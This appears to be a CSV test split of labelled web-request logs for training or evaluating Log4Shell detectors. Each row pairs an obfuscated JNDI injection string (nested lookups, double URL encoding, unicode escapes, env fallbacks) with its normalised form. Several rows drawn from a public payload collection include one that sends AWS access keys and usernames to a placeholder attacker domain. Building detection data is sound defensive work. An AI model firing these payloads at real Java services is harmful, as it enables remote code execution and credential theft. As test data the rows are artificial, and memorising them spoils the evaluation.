id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001162,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://lab-callback.example.org/frag} | method: get | host: app.local | path: /metrics,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-001163,2026-05-17,synthetic,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag},request from user-agent: ${jndi:ldap://lab-callback.example.org/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-001164,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:ldap://lab-callback.example.org/frag},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://lab-callback.example.org/frag},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-001165,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-001166,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-001167,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://lab-callback.example.org/double} | method: get | host: app.local | path: /home,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-001168,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D,request from user-agent: ${jndi:ldap://lab-callback.example.org/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-001169,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /home | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D,request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://lab-callback.example.org/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-001170,2026-05-17,synthetic,GET /search?q=%2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://lab-callback.example.org/double} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,double_url_encoded,path,unseen_obfuscation_test,critical
LS-001171,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=%2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/double},1,log4shell,double_url_encoded,body,unseen_obfuscation_test,critical
LS-001172,2026-05-17,synthetic,GET /?q=%2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/double} http/1.1,1,log4shell,double_url_encoded,minimal_query,unseen_obfuscation_test,critical
LS-001173,2026-05-17,synthetic,GET /api/check?debug=%2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/double} http/1.1 host: app.local,1,log4shell,double_url_encoded,uri_param,unseen_obfuscation_test,critical
LS-001174,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://lab-callback.example.org/double} | method: get | host: app.local | path: /,1,log4shell,double_url_encoded,user_agent,unseen_obfuscation_test,critical
LS-001175,2026-05-17,synthetic,Request from User-Agent: %2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D,request from user-agent: ${jndi:ldap://lab-callback.example.org/double},1,log4shell,double_url_encoded,user_agent_minimal,unseen_obfuscation_test,critical
LS-001176,2026-05-17,synthetic,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: %2524%257Bjndi%253Aldap%253A%252F%252Flab-callback.example.org%252Fdouble%257D,request from user-agent: java/11.0.13 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://lab-callback.example.org/double},1,log4shell,double_url_encoded,x_api_version,unseen_obfuscation_test,critical
LS-001177,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-001178,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-001179,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://lab-callback.example.org/unicode} | method: get | host: app.local | path: /static/app.js,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-001180,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode},request from user-agent: ${jndi:ldap://lab-callback.example.org/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-001181,2026-05-17,synthetic,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://lab-callback.example.org/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
LS-001182,2026-05-17,synthetic,GET /search?q=${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://lab-callback.example.org/unicode} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,unicode_escape,path,unseen_obfuscation_test,critical
LS-001183,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/unicode},1,log4shell,unicode_escape,body,unseen_obfuscation_test,critical
LS-001184,2026-05-17,synthetic,GET /?q=${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/unicode} http/1.1,1,log4shell,unicode_escape,minimal_query,unseen_obfuscation_test,critical
LS-001185,2026-05-17,synthetic,GET /api/check?debug=${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/unicode} http/1.1 host: app.local,1,log4shell,unicode_escape,uri_param,unseen_obfuscation_test,critical
LS-001186,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://lab-callback.example.org/unicode} | method: get | host: app.local | path: /search?q=boots,1,log4shell,unicode_escape,user_agent,unseen_obfuscation_test,critical
LS-001187,2026-05-17,synthetic,Request from User-Agent: ${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode},request from user-agent: ${jndi:ldap://lab-callback.example.org/unicode},1,log4shell,unicode_escape,user_agent_minimal,unseen_obfuscation_test,critical
LS-001188,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${\u006a\u006e\u0064\u0069:ldap://lab-callback.example.org/unicode},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://lab-callback.example.org/unicode},1,log4shell,unicode_escape,x_api_version,unseen_obfuscation_test,critical
LS-001189,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-001190,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-001191,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://lab-callback.example.org/sep} | method: get | host: app.local | path: /home,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-001192,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep},request from user-agent: ${jndi:ldap://lab-callback.example.org/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-001193,2026-05-17,synthetic,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://lab-callback.example.org/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-001194,2026-05-17,synthetic,GET /search?q=${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://lab-callback.example.org/sep} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,path,unseen_obfuscation_test,critical
LS-001195,2026-05-17,synthetic,POST /search HTTP/1.1 Host: app.local Body: query=${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep},post /search http/1.1 host: app.local body: query=${jndi:ldap://lab-callback.example.org/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,body,unseen_obfuscation_test,critical
LS-001196,2026-05-17,synthetic,GET /?q=${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep} HTTP/1.1,get /?q=${jndi:ldap://lab-callback.example.org/sep} http/1.1,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,minimal_query,unseen_obfuscation_test,critical
LS-001197,2026-05-17,synthetic,GET /api/check?debug=${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://lab-callback.example.org/sep} http/1.1 host: app.local,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,uri_param,unseen_obfuscation_test,critical
LS-001198,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:ldap://lab-callback.example.org/sep} | method: get | host: app.local | path: /,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent,unseen_obfuscation_test,critical
LS-001199,2026-05-17,synthetic,Request from User-Agent: ${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep},request from user-agent: ${jndi:ldap://lab-callback.example.org/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,user_agent_minimal,unseen_obfuscation_test,critical
LS-001200,2026-05-17,synthetic,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j${::-n}d${::-i}:l${::-d}ap://lab-callback.example.org/sep},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${jndi:ldap://lab-callback.example.org/sep},1,log4shell,nested_lookup_env_fallback_fragmented_tokens,x_api_version,unseen_obfuscation_test,critical
LS-004357,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:ldap://${java:version}.domain/a} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://${java:version}.domain/a} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup,payload_corpus,unseen_obfuscation_test,critical
LS-004358,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:ldap://${env:JAVA_VERSION}.domain/a} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://${env:java_version}.domain/a} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_env_fallback,payload_corpus,unseen_obfuscation_test,critical
LS-004359,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:ldap://${sys:java.version}.domain/a} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://${sys:java.version}.domain/a} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup,payload_corpus,unseen_obfuscation_test,critical
LS-004360,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:ldap://${sys:java.vendor}.domain/a} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://${sys:java.vendor}.domain/a} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup,payload_corpus,unseen_obfuscation_test,critical
LS-004361,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:ldap://${hostName}.domain/a} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://${hostname}.domain/a} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup,payload_corpus,unseen_obfuscation_test,critical
LS-004362,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:dns://${hostName}.domain} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:dns://${hostname}.domain} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup,payload_corpus,unseen_obfuscation_test,critical
LS-004363,2026-05-17,payloadsallthethings,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://10.10.10.10:1389/a} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:rmi://10.10.10.10:1389/a} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_env_fallback_fragmented_tokens,payload_corpus,unseen_obfuscation_test,critical
LS-004364,2026-05-17,payloadsallthethings,Request from User-Agent: ${${lower:jndi}:${lower:rmi}://10.10.10.10:1389/poc} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:rmi://10.10.10.10:1389/poc} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_lower_upper_lookup,payload_corpus,unseen_obfuscation_test,critical
LS-004365,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}lhost:1389/rce} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://localhost:1389/rce} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_lower_upper_lookup,payload_corpus,unseen_obfuscation_test,critical
LS-004366,2026-05-17,payloadsallthethings,Request from User-Agent: ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//[ATTACKER.DOMAIN.TLD]/a} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://[attacker.domain.tld]/a} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_env_fallback,payload_corpus,unseen_obfuscation_test,critical
LS-004367,2026-05-17,payloadsallthethings,Request from User-Agent: ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//[ATTACKER.DOMAIN.TLD]/a} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://[attacker.domain.tld]/a} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_env_fallback,payload_corpus,unseen_obfuscation_test,critical
LS-004368,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:ldap://${env:USER}.${env:USERNAME} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://${env:user}.${env:username} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_env_fallback,payload_corpus,unseen_obfuscation_test,critical
LS-004369,2026-05-17,payloadsallthethings,Request from User-Agent: ${jndi:ldap://${env:USER}.${env:USERNAME}.[ATTACKER.DOMAIN.TLD]:1389/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY} | Method: GET | Host: external-feed | Path: /,request from user-agent: ${jndi:ldap://${env:user}.${env:username}.[attacker.domain.tld]:1389/${env:aws_access_key_id}/${env:aws_secret_access_key} | method: get | host: external-feed | path: /,1,log4shell,nested_lookup_env_fallback,payload_corpus,unseen_obfuscation_test,critical
